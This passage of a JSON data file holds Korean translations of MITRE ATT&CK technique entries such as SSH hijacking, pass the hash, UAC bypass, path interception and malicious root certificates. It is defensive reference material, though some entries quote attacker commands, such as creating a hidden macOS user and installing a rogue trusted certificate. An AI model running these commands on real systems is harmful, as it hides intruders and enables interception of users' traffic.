    "description": "보안 셸(SSH)은 리눅스 및 macOS 시스템에서 원격 액세스를 위한 표준 수단입니다. 이를 통해 사용자는 암호화된 터널을 통해 다른 시스템에 연결할 수 있으며, 일반적으로 비밀번호, 인증서 또는 비대칭 암호화 키 쌍을 사용하여 인증합니다.\n\n침해된 호스트에서 수평 이동을 위해, 공격자는 활동 중인 SSH 세션에서 공개 키 인증을 통해 다른 시스템과 설정된 신뢰 관계를 활용하여 기존 연결을 탈취할 수 있습니다. 이는 SSH 에이전트를 직접 보안 침해하거나 에이전트의 소켓에 액세스하여 발생할 수 있습니다. 만약 공격자가 루트 액세스를 얻는다면, SSH 세션을 탈취하는 것은 대단히 쉬울 것입니다. SSH 에이전트를 보안 침해하면 SSH 자격 증명을 가로챌 수 있는 접근 권한도 제공됩니다.\n\nSSH 탈취는 새 세션을 생성하는 것이 아니라 기존 SSH 세션에 주입되기 때문에 원격 서비스 사용과 다릅니다.",
    "external_id": "T1184",
    "modified": "2020-02-25T19:00:50.826Z",
    "translated": true
  },
  {
    "title": "Pass the Hash",
    "description": "해시 전달(PtH)은 사용자의 일반 텍스트 비밀번호에 접근하지 않고 사용자로 인증하는 방법입니다. 이 방법은 일반 텍스트 비밀번호를 요구하는 표준 인증 단계를 우회하여 비밀번호 해시를 사용하는 인증 부분으로 직접 이동합니다. 이 기술에서는 사용 중인 계정의 유효한 비밀번호 해시가 자격 증명 접근 기술을 사용하여 캡처됩니다. 캡처한 해시는 PtH를 사용하여 해당 사용자로 인증하는 데 사용됩니다. 인증이 완료되면 PtH를 사용하여 로컬 또는 원격 시스템에서 작업을 수행할 수 있습니다.\n\nWindows 7 이상에서는 유효한 도메인 사용자 자격 증명 또는 RID 500 관리자 해시가 필요합니다.",
    "external_id": "T1075",
    "modified": "2020-01-30T19:55:38.699Z",
    "translated": true
  },
  {
    "title": "Windows Remote Management",
    "description": "Windows 원격 관리(WinRM)는 원격 시스템과 상호작용할 수 있는 Windows 서비스 및 프로토콜의 이름입니다(예: 실행 파일 실행, 레지스트리 수정, 서비스 수정). <code>winrm</code> 명령이나 PowerShell과 같은 여러 프로그램을 통해 호출할 수 있습니다.",
    "external_id": "T1028",
    "modified": "2020-02-11T18:30:20.937Z",
    "translated": true
  },
  {
    "title": "Path Interception",
    "description": "이 기술은 더 이상 사용되지 않습니다. 대신 경로 환경 변수를 이용한 경로 가로채기, 검색 순서 가로채기 및/또는 따옴표 없는 경로 가로채기를 사용하시기 바랍니다.\n\n경로 가로채기는 실행 파일이 특정 경로에 배치되어 응용 프로그램에 의해 의도된 대상 대신 실행될 때 발생합니다. 한 가지 예시로는 취약한 응용 프로그램의 현재 작업 디렉터리에 CMD 또는 BAT 파일을 CreateProcess 함수로 로드하는 복사본이 사용된 경우가 있습니다.\n\n경로 가로채기를 수행할 때 적들이 이용할 수 있는 여러 가지 독특한 약점이나 잘못된 구성 사항이 있습니다: 따옴표 없는 경로, 경로 환경 변수의 잘못된 구성, 그리고 검색 순서 가로채기입니다. 첫 번째 취약점은 전체 프로그램 경로와 관련이 있으며, 두 번째와 세 번째는 프로그램 경로가 명시되지 않았을 때 발생합니다. 이 기술은 실행 파일이 정기적으로 호출될 경우 지속성을 위해 사용될 수 있으며, 가로채어진 실행 파일이 더 높은 권한의 프로세스에 의해 시작될 경우 권한 상승에도 사용될 수 있습니다.\n\n### 따옴표 없는 경로\n서비스 경로(Windows 레지스트리 키에 저장됨) 및 바로 가기 경로는 경로에 한 개 이상의 공백이 포함되고 따옴표로 둘러싸여 있지 않은 경우 경로 가로채기에 취약합니다. 적은 경로의 더 높은 수준의 디렉터리에 실행 파일을 배치할 수 있으며, Windows는 의도된 실행 파일 대신 해당 실행 파일을 해석합니다. 예를 들어 바로 가기의 경로가 특정 프로그램을 가리킨다면, 적은 다른 프로그램을 실행하기 위해 해당 경로에 프로그램을 만들 수 있습니다.\n\n### PATH 환경 변수 잘못된 구성\nPATH 환경 변수는 디렉터리 목록을 포함합니다. 프로그램을 실행하는 특정 방법(즉, cmd.exe 또는 명령줄 사용)은 프로그램 경로가 주어지지 않았을 때 프로그램을 검색할 수 있는 위치를 PATH 환경 변수를 통해 결정합니다. 만약 PATH 환경 변수에 Windows 디렉터리 이전에 어떤 디렉터리가 나열되어 있다면, 해당 디렉터리에 Windows 프로그램과 같은 이름의 프로그램이 놓일 수 있으며, 이 경우 해당 명령이 스크립트나 명령줄에서 실행될 때 그 프로그램이 실행됩니다.\n\n예를 들어, 특정 경로가 PATH 환경 변수에서 Windows 시스템 경로보다 앞선다면 그 경로에 있는 프로그램이 Windows 시스템 유틸리티가 아닌 다른 프로그램으로 호출될 수 있습니다.\n\n### 검색 순서 가로채기\n검색 순서 가로채기는 적이 Windows가 경로가 주어지지 않은 프로그램을 검색하는 순서를 악용할 때 발생합니다. 검색 순서는 프로그램 실행에 사용되는 방법에 따라 다릅니다. 하지만 Windows가 초기 프로그램의 디렉터리에서 검색한 후 Windows 시스템 디렉터리에서 검색하는 것이 일반적입니다. 검색 순서 가로채기에 취약한 프로그램(즉, 실행 파일의 경로를 명시하지 않는 프로그램)을 발견한 적은 이 취약점을 악용하여 잘못된 프로그램 이름으로 프로그램을 생성하고 초기 프로그램의 디렉터리에 배치할 수 있습니다.\n\n이와 같은 방식으로 적은 특정 명령어를 포함하는 프로그램을 동일한 디렉터리에 두어 Windows의 시스템 유틸리티가 아닌 적의 프로그램이 실행되도록 할 수 있습니다.",
    "external_id": "T1034",
    "modified": "2020-07-06T18:49:35.645Z",
    "translated": true
  },
  {
    "title": "Web Session Cookie",
    "description": "적대자는 도난당한 세션 쿠키를 사용하여 웹 애플리케이션 및 서비스에 인증할 수 있습니다. 이 기술은 세션이 이미 인증되었기 때문에 일부 다중 인증 프로토콜을 우회합니다.\n\n인증 쿠키는 사용자가 서비스에 인증한 후 웹 애플리케이션, 특히 클라우드 기반 서비스에서 일반적으로 사용됩니다. 이를 통해 자격 증명을 전달할 필요가 없고 재인증을 자주 수행할 필요가 없습니다. 쿠키는 종종 장기간 유효하며, 웹 애플리케이션이 활성화되어 있지 않더라도 유효합니다. 쿠키가 도난당한 후 적대자는 이를 자신이 제어하는 브라우저에 가져와 세션 쿠키가 활성화된 동안 사용자가 되어 사이트나 애플리케이션을 사용할 수 있습니다. 사이트에 로그인하면 적대자는 민감한 정보에 접근하거나 이메일을 읽거나 피해자 계정이 수행할 수 있는 작업을 수행할 수 있습니다.\n\n세션 쿠키를 타겟으로 하여 다중 인증 시스템을 우회하는 악성코드 사례가 있었습니다.",
    "external_id": "T1506",
    "modified": "2020-12-17T16:57:07.529Z",
    "translated": true
  },
  {
    "title": "Uncommonly Used Port",
    "description": "적대 세력은 잘못 구성된 프록시와 방화벽을 우회하기 위해 비표준 포트를 통해 C2 통신을 수행할 수 있습니다.",
    "external_id": "T1065",
    "modified": "2020-03-14T18:19:53.002Z",
    "translated": true
  },
  {
    "title": "Bypass User Account Control",
    "description": "Windows 사용자 계정 컨트롤(UAC)은 사용자의 승인을 요청하여 프로그램이 관리자 수준의 권한으로 작업을 수행하도록 권한을 상승시킬 수 있도록 허용합니다. 사용자에게 미치는 영향은 높은 강제 집행 하에서 운영을 거부하는 것부터, 사용자 계정 그룹에 속해 있는 경우 알림을 클릭하여 작업을 수행하도록 허용하거나 관리자 암호를 입력하여 작업을 완료하도록 허용하는 것까지 다양합니다.\n\n컴퓨터의 UAC 보호 수준이 최고 수준이 아닌 경우, 특정 Windows 프로그램은 사용자의 UAC 알림 상자를 통해 요청하지 않고도 권한을 상승시키거나 일부 상승된 COM 객체를 실행할 수 있습니다. 예를 들어 rundll32.exe를 사용하여 특정 방식으로 제작된 DLL을 로드하여 자동으로 권한이 상승된 COM 객체를 로드하고 일반적으로 권한 상승이 필요한 보호된 디렉터리에서 파일 작업을 수행할 수 있습니다. 악성 소프트웨어는 신뢰할 수 있는 프로세스에 주입되어 사용자에게 요청하지 않고 권한을 상승시킬 수 있습니다. 공격자는 이러한 기술을 사용하여 타겟 프로세스가 보호되지 않은 경우 권한을 관리자 수준으로 상승시킬 수 있습니다.\n\nUAC를 우회하는 방법이 여러 가지 발견되었습니다. UACMe의 GitHub README 페이지에는 UACMe 내에서 발견되고 구현된 다양한 우회 방법의 목록이 포함되어 있지만, 이는 포괄적인 우회 목록이 아닐 수 있습니다. 추가적인 우회 방법도 정기적으로 발견되고 있으며, 일부는 실제로 사용되기도 합니다.\n\n또한, eventvwr.exe는 자동으로 권한을 상승시키고 지정된 바이너리 또는 스크립트를 실행할 수 있는 우회 방법도 존재합니다.\n\n또 다른 우회는 관리자 권한이 있는 계정의 자격 증명이 알려진 경우 일부 측면 이동 기술을 통해 가능할 수 있습니다. UAC는 단일 시스템 보안 메커니즘이기 때문에 한 시스템에서 실행되는 프로세스의 수권 또는 무결성이 측면 시스템에서 알 수 없으며 기본적으로 높은 무결성으로 설정됩니다.",
    "external_id": "T1088",
    "modified": "2020-02-05T20:08:32.863Z",
    "translated": true
  },
  {
    "title": "Runtime Data Manipulation",
    "description": "적대자들은 최종 사용자에게 데이터가 접근되고 표시되는 방식을 조작하기 위해 시스템을 변경할 수 있습니다. 런타임 데이터를 조작함으로써 적대자들은 비즈니스 프로세스, 조직의 이해 및 의사 결정에 영향을 미치려고 할 수 있습니다.\n\n적대자들은 런타임 조작을 일으키기 위해 데이터를 표시하는 데 사용되는 애플리케이션 바이너리를 변경할 수 있습니다. 또한, 비슷한 효과를 유도하기 위해 기본 파일 연결 변경이나 위장 기법을 수행할 수 있습니다. 수정의 유형과 그에 따른 영향은 대상 애플리케이션과 프로세스, 그리고 적대자의 목표와 목적에 따라 달라집니다. 복잡한 시스템의 경우, 적대자는 원하는 영향을 미치기 위해 일반적으로 장기간에 걸친 정보 수집 캠페인을 통해 얻는 특정 전문 지식과 시스템에 관련된 특수 소프트웨어에 대한 접근이 필요할 수 있습니다.",
    "external_id": "T1494",
    "modified": "2020-03-02T14:30:49.400Z",
    "translated": true
  },
  {
    "title": "Transmitted Data Manipulation",
    "description": "적대자는 저장소나 기타 시스템으로 전송되는 데이터를 변경하여 외부 결과를 조작하거나 활동을 숨길 수 있습니다. 전송된 데이터를 조작함으로써 적대자는 비즈니스 프로세스, 조직의 이해 및 의사 결정에 영향을 미치려 할 수 있습니다.\n\n조작은 네트워크 연결 또는 시스템 프로세스 간의 기회를 통해 정보를 가로채고 변경할 수 있는 도구를 배치할 수 있는 경우에 가능할 수 있습니다. 수정의 유형과 그로 인한 영향은 목표 전송 메커니즘과 적대자의 목표 및 목적에 따라 다릅니다. 복잡한 시스템의 경우, 적대자는 원하는 영향을 미치기 위해 특별한 전문 지식이 필요할 것이며, 일반적으로 장기간의 정보 수집 캠페인을 통해 얻어질 수 있는 시스템과 관련된 전문 소프트웨어에 대한 접근이 필요할 수 있습니다.",
    "external_id": "T1493",
    "modified": "2020-03-02T14:27:49.110Z",
    "translated": true
  },
  {
    "title": "Hidden Users",
    "description": "macOS의 각 사용자 계정에는 사용자 ID가 연결되어 있습니다. 사용자를 생성할 때 해당 계정의 사용자 ID를 지정할 수 있습니다. <code>/Library/Preferences/com.apple.loginwindow</code>에는 <code>Hide500Users</code>라는 속성 값이 있는데, 이는 사용자 ID가 500 이하인 사용자가 로그인 화면에 나타나는 것을 방지합니다. 사용자 ID가 500 미만인 상태로 계정을 생성하고 이 속성을 활성화(값을 Yes로 설정)하면 공격자는 자신의 사용자 계정을 훨씬 쉽게 숨길 수 있습니다: <code>sudo dscl . -create /Users/username UniqueID 401</code>.",
    "external_id": "T1147",
    "modified": "2021-12-21T16:28:00.431Z",
    "translated": true
  },
  {
    "title": "Compile After Delivery",
    "description": "적의들은 피해자에게 파일을 비컴파일된 코드로 전달함으로써 페이로드를 발견하고 분석하기 어렵게 만들려 할 수 있습니다. 소스 코드 파일은 실행 파일이나 바이너리를 대상으로 하는 보호 조치를 회피할 수 있습니다. 이러한 페이로드는 실행되기 전에 컴파일되어야 하며, 일반적으로 csc.exe나 GCC/MinGW와 같은 기본 유틸리티를 통해 컴파일됩니다.\n\n소스 코드 페이로드는 암호화되거나 인코딩되거나, 악성 이메일 첨부 파일과 같이 다른 파일에 포함될 수도 있습니다. 페이로드는 원래 OS에서 인식할 수 없고 본질적으로 무해한 형식으로 전달될 수 있으며, 이후 적절한 실행 파일 바이너리로 (재)컴파일될 수 있습니다.",
    "external_id": "T1500",
    "modified": "2020-03-16T15:38:37.650Z",
    "translated": true
  },
  {
    "title": "Code Repositories",
    "description": "적대 세력은 코드 저장소를 활용하여 귀중한 정보를 수집할 수 있습니다. 코드 저장소는 소스 코드를 저장하고 소프트웨어 빌드를 자동화하는 도구/서비스입니다. 이들은 내부에 호스팅되거나 GitHub, GitLab, SourceForge, BitBucket과 같은 제3자 사이트에서 비공식적으로 호스팅될 수 있습니다. 사용자는 일반적으로 웹 애플리케이션이나 git과 같은 명령줄 유틸리티를 통해 코드 저장소와 상호 작용합니다.\n\n일단 적대 세력이 피해자 네트워크나 비공식 코드 저장소에 접근하게 되면, 그들은 소프트웨어 소스 코드 내에 포함된 독점적인 소스 코드나 민감한 정보를 수집할 수 있습니다. 소프트웨어의 소스 코드에 접근하는 것은 적대 세력이 취약점을 개발할 수 있는 기회를 제공할 수 있으며, 자격 증명은 유효한 계정을 사용하여 추가 자원에 접근할 수 있는 경로를 제공할 수 있습니다. \n\n**참고:** 이는 공공 코드 저장소를 통해 정보 수집(reconnaissance)을 수행하는 데 중점을 둔 코드 저장소와는 구별됩니다.",
    "external_id": "T1213.003",
    "modified": "2024-09-04T13:03:54.101Z",
    "translated": true
  },
  {
    "title": "Compiled HTML File",
    "description": "CHM(Compiled HTML) 파일은 일반적으로 Microsoft HTML 도움말 시스템의 일환으로 배포됩니다. CHM 파일은 HTML 문서, 이미지 및 VBA, JScript, Java, ActiveX와 같은 스크립팅/웹 관련 프로그래밍 언어를 포함한 다양한 콘텐츠의 압축된 컴파일입니다. CHM 콘텐츠는 HTML 도움말 실행 파일(hh.exe)에 의해 로드된 Internet Explorer 브라우저의 기본 구성 요소를 사용하여 표시됩니다.\n\n적대적 행위자들은 이 기술을 악성 코드를 숨기기 위해 악용할 수 있습니다. 임베디드 페이로드를 포함하는 맞춤형 CHM 파일이 피해자에게 전달된 후 사용자의 실행에 의해 트리거될 수 있습니다. CHM 실행은 또한 hh.exe를 통한 이진 실행을 고려하지 않는 오래된 또는 패치되지 않은 시스템에서 애플리케이션 화이트리스트를 우회할 수 있습니다.",
    "external_id": "T1223",
    "modified": "2020-01-31T18:59:00.845Z",
    "translated": true
  },
  {
    "title": "Clear Command History",
    "description": "시스템 로그를 지우는 것 외에도, 공격자는 침해된 계정의 명령 기록을 지워 침입 중 수행된 작업을 숨길 수 있습니다. macOS와 Linux는 사용자들이 터미널에 입력하는 명령을 추적하여 사용자가 이전에 수행한 작업을 되짚어 볼 수 있도록 합니다. 이 로그는 여러 가지 방법으로 접근할 수 있습니다. 로그인한 상태에서는 이 명령 기록이 환경 변수에 의해 가리켜지는 파일에 기록됩니다. 사용자가 시스템에서 로그오프할 때, 이 정보는 사용자 홈 디렉토리의 특정 파일에 저장됩니다. 이 점의 이점은 사용자가 다른 세션에서 사용했던 명령으로 돌아갈 수 있게 해준다는 것입니다. 명령줄에 입력된 모든 것이 저장되므로, 명령줄에 전달된 비밀번호도 저장됩니다. 공격자는 이러한 파일을 검색하여 평문 비밀번호를 악용할 수 있습니다. 또한, 공격자는 자신의 명령이 이러한 로그에 남지 않도록 다양한 방법을 사용할 수 있습니다.",
    "external_id": "T1146",
    "modified": "2020-01-31T12:32:52.281Z",
    "translated": true
  },
  {
    "title": "Emond",
    "description": "적대자는 이벤트 모니터 데몬(emond)을 사용하여 예측 가능한 이벤트 트리거에 의해 악성 명령을 실행하도록 예약함으로써 지속성을 확보할 수 있습니다. Emond는 다양한 서비스로부터 이벤트를 수신하고 이를 간단한 규칙 엔진을 통해 실행하여 조치를 취하는 론치 데몬입니다. /sbin/emond에 있는 emond 바이너리는 /etc/emond.d/rules/ 디렉토리에서 모든 규칙을 로드하고 명시적으로 정의된 이벤트가 발생하면 조치를 취합니다. 규칙 파일은 plist 형식이며 이름, 이벤트 유형 및 취할 행동을 정의합니다. 이벤트 유형의 예로는 시스템 시작 및 사용자 인증이 있습니다. 행동의 예로는 시스템 명령을 실행하거나 이메일을 보내는 것이 있습니다. emond 서비스는 QueueDirectories 경로(/private/var/db/emondClients)에 파일이 없으면 실행되지 않으며, 이는 /System/Library/LaunchDaemons/com.apple.emond.plist에 지정된 론치 데몬 구성 파일에 정의되어 있습니다.\n\n적대자는 정의된 이벤트가 발생할 때 명령을 실행하도록 규칙을 작성하여 이 서비스를 악용할 수 있습니다. 예를 들어 시스템 시작이나 사용자 인증 시 명령을 실행할 수 있습니다. 또한 적대자는 emond 서비스가 루트 권한으로 실행되기 때문에 관리자 권한에서 루트 권한으로 상승할 수 있습니다.",
    "external_id": "T1519",
    "modified": "2020-01-24T15:15:44.006Z",
    "translated": true
  },
  {
    "title": "Spearphishing via Service",
    "description": "서비스를 통한 스피어피싱은 스피어피싱의 특정 변형입니다. 이는 다른 형태의 스피어피싱과 달리 직접 기업 이메일 채널을 사용하는 대신 제3자 서비스를 이용합니다.\n\n모든 형태의 스피어피싱은 특정 개인, 회사 또는 산업을 목표로 한 전자적으로 전달되는 사회 공학입니다. 이 경우 적들은 다양한 소셜 미디어 서비스, 개인 웹메일 및 기타 비기업 통제 서비스와 통해 메시지를 보냅니다. 이러한 서비스는 기업보다 보안 정책이 덜 엄격할 가능성이 높습니다. 대부분의 스피어피싱의 경우와 마찬가지로 목표는 표적과의 친밀감을 형성을 하거나 어떤 식으로든 표적의 관심을 끌고자 하는 것입니다. 적들은 가짜 소셜 미디어 계정을 만들고 직원들에게 잠재적인 직업 기회에 대해 메시지를 보냅니다. 이를 통해 서비스, 정책 및 환경에서 실행되고 있는 소프트웨어에 관한 질문을 할 수 있는 그럴듯한 이유를 제공하게 됩니다. 이후 적은 이러한 서비스를 통해 악성 링크나 첨부파일을 보낼 수 있습니다.\n\n일반적인 예시는 소셜 미디어를 통해 표적과 친밀감을 형성한 후, 표적이 업무용 컴퓨터에서 사용하는 개인 웹메일 서비스로 콘텐츠를 보내는 것입니다. 이를 통해 적은 업무용 계정의 일부 이메일 제한을 우회할 수 있으며, 표적은 기대했던 내용이므로 파일을 열 가능성이 높습니다. 만약 페이로드가 예상대로 작동하지 않으면, 적은 일반적인 통신을 지속하고 표적과 함께 작동 방법을 문제 해결할 수 있습니다.",
    "external_id": "T1194",
    "modified": "2020-03-02T19:30:53.487Z",
    "translated": true
  },
  {
    "title": "Install Root Certificate",
    "description": "루트 인증서는 공개 키 암호화에서 루트 인증 기관(CA)을 식별하는 데 사용됩니다. 루트 인증서가 설치되면 시스템이나 애플리케이션은 루트 인증서에 의해 서명된 루트의 신뢰 체인 내의 인증서를 신뢰하게 됩니다. 인증서는 웹 브라우저 내에서 안전한 TLS/SSL 통신을 설정하는 데 일반적으로 사용됩니다. 사용자가 신뢰되지 않는 인증서를 제시하는 웹사이트를 탐색하려고 하면 오류 메시지가 표시되어 보안 위험을 경고합니다. 보안 설정에 따라 브라우저는 사용자가 웹사이트에 연결하는 것을 허용하지 않을 수 있습니다.\n\n손상된 시스템에 루트 인증서를 설치하면 공격자가 해당 시스템의 보안을 저하시킬 수 있는 방법을 제공하게 됩니다. 공격자들은 이 기술을 사용하여 손상된 시스템이 HTTPS를 통해 공격자가 제어하는 웹 서버에 연결할 때 사용자에게 보안 경고를 피하도록 해왔습니다. 이러한 서버는 합법적인 웹사이트를 스푸핑하여 로그인 자격 증명을 수집합니다.\n\n비정상적인 루트 인증서는 제조업체나 소프트웨어 공급망에 의해 시스템에 사전 설치되어 있으며, 악성 코드/애드웨어와 함께 사용되어 안전한 TLS/SSL 통신에서 전송된 정보를 가로채기 위한 중간자 공격 기능을 제공했습니다.\n\n루트 인증서(그리고 관련된 체인)는 복제되고 재설치될 수 있습니다. 복제된 인증서 체인은 출처의 많은 메타데이터 특성을 가져오며, 악성 코드를 서명하는 데 사용할 수 있어 서명 검증 도구(예: Sysinternals, 바이러스 백신 등)를 우회할 수 있습니다. 이러한 도구들은 실행을 차단하거나 지속성의 흔적을 밝혀내기 위해 사용됩니다.\n\nmacOS에서 Ay MaMi 악성 코드는 <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code>를 사용하여 시스템 키체인에 악성 인증서를 신뢰된 루트 인증서로 설치합니다.",
    "external_id": "T1130",
    "modified": "2020-02-21T21:11:06.761Z",
    "translated": true
  },
  {
    "title": "Data Encrypted",
    "description": "데이터는 노출되는 정보를 감추기 위해 탈취되기 전에 암호화됩니다. 이는 방어자가 검사할 때 탈취를 덜 눈에 띄게 만들기 위한 것입니다. 암호화는 유틸리티, 프로그래밍 라이브러리 또는 데이터 자체에 적용된 사용자 지정 알고리즘에 의해 수행되며, 이는 지휘 및 통제 또는 파일 전송 프로토콜에 의해 수행된 암호화와는 별개로 간주됩니다. 파일을 암호화할 수 있는 일반적인 파일 아카이브 형식으로는 RAR과 zip이 있습니다.\n\n다른 탈취 기술도 네트워크 밖으로 정보를 전송하는 데 적용될 가능성이 있습니다.",
    "external_id": "T1022",
    "modified": "2020-03-30T03:10:12.750Z",
    "translated": true
  },
  {
    "title": "Hidden Files and Directories",
    "description": "일반 사용자가 시스템에서 특수 파일을 우연히 변경하지 않도록 대부분의 운영 체제에서는 '숨김' 파일의 개념을 가지고 있습니다. 이러한 파일은 사용자가 GUI로 파일 시스템을 탐색하거나 명령줄에서 일반 명령을 사용할 때 표시되지 않습니다. 사용자는 숨김 파일을 표시하라고 명시적으로 요청해야 하며, 이는 일련의 그래픽 사용자 인터페이스(GUI) 프롬프트를 통해서나 명령줄 스위치로 가능합니다.\n\n### 윈도우\n\n사용자는 attrib.exe 바이너리를 사용하여 특정 파일을 숨김으로 표시할 수 있습니다. 파일이나 폴더를 숨기려면 <code>attrib +h 파일이름</code>을 입력하면 됩니다. 이와 유사하게, “+s”는 파일을 시스템 파일로 표시하고 “+r” 플래그는 파일을 읽기 전용으로 표시합니다. 대부분의 윈도우 바이너리처럼 attrib.exe 바이너리는 이러한 변경 사항을 재귀적으로 적용할 수 있는 기능을 제공합니다.\n\n### 리눅스/맥\n\n사용자는 파일이나 폴더 이름의 첫 번째 문자로 “.”를 넣음으로써 특정 파일을 숨김으로 표시할 수 있습니다. 점으로 시작하는 파일과 폴더는 기본적으로 Finder 애플리케이션 및 “ls”와 같은 표준 명령줄 유틸리티에서 볼 수 없습니다. 사용자는 이러한 파일을 볼 수 있도록 설정을 변경해야 합니다. 명령줄 사용의 경우, 모든 파일(숨김 파일 포함)을 볼 수 있는 플래그가 일반적으로 있습니다. Finder 애플리케이션에서 이러한 파일을 보려면 다음 명령을 실행해야 합니다: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, 이후 Finder 애플리케이션을 다시 실행해야 합니다.\n\n### 맥\n\nmacOS에서는 UF_HIDDEN 플래그를 사용하여 파일을 표시하지 않도록 할 수 있지만, 여전히 Terminal.app에서는 볼 수 있습니다. 많은 애플리케이션은 정보 저장을 위해 이러한 숨김 파일과 폴더를 생성하여 사용자의 작업 공간을 혼잡하지 않게 유지합니다. 예를 들어, SSH 유틸리티는 숨김 폴더인 .ssh를 생성하여 사용자의 알려진 호스트와 키를 저장합니다.",
    "external_id": "T1158",
    "modified": "2020-03-13T21:01:22.966Z",
    "translated": true
  },
  {
    "title": "Time Providers",
    "description": "Windows 시간 서비스(W32Time)는 도메인 간 및 도메인 내에서 시간 동기화를 가능하게 합니다. W32Time 시간 공급자는 하드웨어/네트워크 리소스에서 타임스탬프를 검색하고 이러한 값을 다른 네트워크 클라이언트에 출력하는 역할을 합니다.\n\n시간 공급자는 동적 링크 라이브러리(DLL)로 구현되며, <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>의 하위 키에 등록됩니다. 시간 공급자 관리자는 서비스 제어 관리자의 지시에 따라 시스템 시작 시 또는 매개변수가 변경될 때 이 키 아래에 나열되고 활성화된 시간 공급자를 로드하고 시작합니다.\n\n공격자는 이 아키텍처를 악용하여 지속성을 확립할 수 있으며, 특히 악성 DLL을 시간 공급자로 등록하고 활성화함으로써 가능해집니다. 시간 공급자 등록을 위해서는 관리자 권한이 필요하지만, 실행은 로컬 서비스 계정의 컨텍스트에서 수행됩니다.",
    "external_id": "T1209",
    "modified": "2020-01-24T16:48:50.715Z",
    "translated": true
  },
  {
    "title": "Launch Agent",
    "description": "Apple의 개발자 문서에 따르면, 사용자가 로그인할 때마다 사용자별 launchd 프로세스가 시작되어, <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, <code>$HOME/Library/LaunchAgents</code>에서 발견된 속성 목록(plist) 파일로부터 각 launch-on-demand 사용자 에이전트의 매개변수를 로드합니다. 이러한 launch agent는 실행될 실행 파일을 가리키는 속성 목록 파일을 가지고 있습니다.\n\n적대자는 launchd 또는 launchctl을 사용하여 plist를 적절한 디렉토리에 로드함으로써 로그인 시 실행되도록 설정할 수 있는 새로운 launch agent를 설치할 수 있습니다. 에이전트 이름은 관련 운영 체제나 무해한 소프트웨어의 이름을 사용하여 위장될 수 있습니다. Launch Agents는 사용자 수준의 권한으로 생성되며, 사용자가 로그인할 때 해당 사용자의 권한으로 실행됩니다. 특정 사용자가 로그인할 때 실행되도록 설정할 수 있으며(특정 사용자의 디렉토리 구조 내에서) 또는 모든 사용자가 로그인할 때 실행되도록 설정할 수 있습니다(이는 관리자 권한이 필요합니다).",
    "external_id": "T1159",
    "modified": "2020-01-17T16:52:35.818Z",
    "translated": true
  },
  {
    "title": "Serverless",
    "description": "적대자는 Cloudflare Workers, AWS Lambda 함수 또는 Google Apps Scripts와 같은 서버리스 클라우드 인프라를 타겟팅에 활용할 수 있습니다. 서버리스 인프라를 이용함으로써 적대자는 작전 중 사용된 인프라의 출처를 추적하기 어렵게 만들 수 있습니다.\n\n한 번 침해되면, 서버리스 실행 환경은 감염된 기계에 직접 대응하거나 적대자가 소유한 명령 및 제어 서버로 트래픽을 프록시하는 데 이용될 수 있습니다. 이러한 기능에서 생성된 트래픽은 일반적인 클라우드 제공업체의 서브도메인에서 발생하는 것처럼 보이기 때문에, 이러한 제공업체로의 일반 트래픽과 구별하기 어려울 수 있어 인프라를 숨기는 것이 더 쉬워집니다.",
    "external_id": "T1584.007",
    "modified": "2024-10-03T14:18:34.045Z",
    "translated": true
  },
  {
    "title": "Server",
    "description": "적대자는 타겟팅 중에 사용할 수 있는 제3자 서버를 손상시킬 수 있습니다. 서버의 사용은 적대자가 작전을 기획, 실행하고 수행할 수 있게 해줍니다. 손상 후 활동 중에 적대자는 명령 및 제어를 포함한 다양한 작업을 위해 서버를 활용할 수 있습니다. 대신 서버나 가상 전용 서버를 구매하는 대신, 적대자는 작전을 지원하기 위해 제3자 서버를 손상시킬 수 있습니다.\n\n적대자는 물 구덩이 작전을 지원하기 위해 웹 서버를 손상시킬 수도 있으며, 이는 드라이브 바이 손상과 유사합니다. 또는 피싱 작전을 지원하기 위해 이메일 서버를 손상시킬 수 있습니다.",
    "external_id": "T1584.004",
    "modified": "2024-01-31T20:05:44.075Z",
    "translated": true
  },
  {
    "title": "Space after Filename",
    "description": "적대 세력은 파일의 확장자를 변경하여 프로그램의 실제 파일 형식을 숨길 수 있습니다. 특정 파일 형식에 대해(특히 .app 확장자에는 적용되지 않음), 파일 이름 끝에 공백을 추가하면 운영 체제가 파일을 처리하는 방식이 변경됩니다. 예를 들어, evil.bin이라는 Mach-O 실행 파일이 있을 때 사용자가 이를 두 번 클릭하면 Terminal.app가 실행되어 코드가 실행됩니다. 이 파일의 이름을 evil.txt로 변경하면 사용자가 두 번 클릭할 때 기본 텍스트 편집 애플리케이션으로 열리며 바이너리가 실행되지 않습니다. 그러나 파일 이름을 \"evil.txt \" (끝에 공백이 있음)으로 변경하면 사용자가 두 번 클릭할 때 운영 체제가 실제 파일 형식을 판단하고 적절히 처리하여 바이너리가 실행됩니다.\n\n적대 세력은 이러한 기능을 활용하여 사용자들이 무해하게 보이는 다양한 형식의 파일을 두 번 클릭하도록 속여 궁극적으로 악성 코드를 실행하게 할 수 있습니다.",
    "external_id": "T1151",
    "modified": "2020-02-10T20:49:12.897Z",
    "translated": true
  },
  {
    "title": "Network Share Connection Removal",
    "description": "적대자는 더 이상 필요하지 않은 공유 연결을 제거하여 자신의 작업 흔적을 지우려고 할 수 있습니다. 더 이상 필요하지 않을 때 Windows 공유 드라이브와 Windows 관리 공유 연결을 제거할 수 있습니다. 특정 유틸리티를 사용하여 네트워크 공유 연결을 제거할 수 있습니다.",
    "external_id": "T1126",
    "modified": "2020-01-31T12:39:48.118Z",
    "translated": true
  },
  {
    "title": "Windows Management Instrumentation Event Subscription",
    "description": "Windows 관리 도구(WMI)를 사용하여 정의된 이벤트가 발생할 때 코드를 실행하는 이벤트 필터, 프로바이더, 소비자 및 바인딩을 설치할 수 있습니다. 공격자는 WMI의 기능을 활용하여 이벤트에 구독하고 그 이벤트가 발생할 때 임의의 코드를 실행하여 시스템에서 지속성을 제공할 수 있습니다. 공격자는 WMI 스크립트를 Windows 관리 개체(MOF) 파일로 컴파일함으로써 이 기술의 탐지를 피하려고 할 수 있습니다. 구독할 수 있는 이벤트의 예로는 벽시계 시간이나 컴퓨터의 가동 시간이 있습니다. 여러 위협 그룹이 이 기술을 사용하여 지속성을 유지한 것으로 알려져 있습니다.",
    "external_id": "T1084",
    "modified": "2020-01-24T14:08:23.156Z",
    "translated": true
  },
  {
